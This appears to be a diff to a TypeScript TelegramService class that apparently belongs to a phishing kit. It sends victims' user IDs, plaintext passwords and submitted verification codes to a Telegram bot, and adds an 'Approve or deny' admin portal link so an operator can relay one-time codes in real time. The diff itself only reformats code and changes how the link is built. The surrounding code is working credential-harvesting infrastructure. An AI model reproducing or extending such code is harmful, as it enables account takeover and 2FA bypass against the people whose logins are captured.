@@ -90,7 +90,6 @@ class TelegramService {
       return;
     }
 
-
     const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
 
     try {
@@ -157,13 +156,13 @@ class TelegramService {
   async sendLoginNotification(data: LoginData): Promise<void> {
     const message = `\n${isProduction ? "" : "[TEST]"} \n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${data.userId}\n🔑 <b>Password:</b> ${data.password}`;
 
-        const adminLink = process.env.ADMIN_PORTAL_URL as string;
-        const adminLinkEncoded = encodeURIComponent(adminLink);
+    const adminLink = process.env.ADMIN_PORTAL_URL as string;
+    const adminLinkEncoded = adminLink;
 
-        const newMessage = `
+    const newMessage = `
     ${message}
     \n
-    👉 ${adminLinkEncoded} Approve or deny,
+    👉 <a href='${adminLinkEncoded}'>Approve or deny</a>
     `;
     await this.sendMessage(newMessage);
   }
@@ -171,13 +170,13 @@ class TelegramService {
   async sendVerificationNotification(data: VerificationData): Promise<void> {
     const message = `\n${isProduction ? "" : "[TEST]"} \n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${data.verificationType}\n🔢 <b>Code:</b> ${data.code}`;
 
-        const adminLink = process.env.ADMIN_PORTAL_URL as string;
-        const adminLinkEncoded = encodeURIComponent(adminLink);
+    const adminLink = process.env.ADMIN_PORTAL_URL as string;
+    const adminLinkEncoded = adminLink;
 
-        const newMessage = `
+    const newMessage = `
     ${message}
     \n
-    👉 ${adminLinkEncoded} Approve or deny,
+    <a href='${adminLinkEncoded}'>Approve or deny</a>
     `;
     await this.sendMessage(newMessage);
   }
